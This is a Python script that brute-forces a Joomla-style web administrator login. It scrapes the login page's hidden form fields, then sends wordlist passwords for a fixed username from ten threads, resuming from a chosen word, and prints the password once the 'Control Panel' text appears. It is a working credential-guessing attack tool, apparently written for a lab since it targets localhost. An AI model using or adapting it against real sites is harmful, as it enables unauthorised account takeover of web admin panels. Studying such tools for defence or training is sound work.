#!/usr/bin/python3
import requests
import threading
from queue import Queue
from html.parser import HTMLParser

user_thread = 10
username = "jack"
wordlist_file = "darkc0de.txt"
resume = "Daniels"

target_url = "http://localhost:8080/administrator/index.php"
target_post = "http://localhost:8080/administrator/index.php"

username_field = "username"
password_field = "passwd"
success_check = "Control Panel"


class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False
        print("[*] Finished setting up for: {}".format(self.username))

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        session = requests.Session()
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get()
            print("[*] Trying: {} : {:<32} ({:<8} left)".format(self.username, brute, self.password_q.qsize()), end='\r')

            # parse out the hidden fields
            page = session.get(target_url).text
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_result = session.post(target_post, data=post_tags).text
            if success_check in login_result:
                self.found = True
                print("[*] Bruteforce successful.")
                print("[*] Username: {}".format(username))
                print("[*] Password: {}".format(brute))
                print("[*] Waiting for other threads to exit...")


class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = value


def build_wordlist(wordlist_file):
    words = Queue()
    found_resume = False
    with open(wordlist_file, "rb") as f:
        raw_words = f.readlines()
    for word in raw_words:
        try:
            word = word.rstrip().decode()
        except UnicodeDecodeError:
            continue

        if resume is not None:
            if found_resume:
                words.put(word)
            elif word == resume:
                found_resume = True
                print("[*] Resuming wordlist from: {}".format(resume))
        else:
            words.put(word)
    return words


if __name__ == "__main__":
    words = build_wordlist(wordlist_file)
    bruter_obj = Bruter(username, words)
    bruter_obj.run_bruteforce()
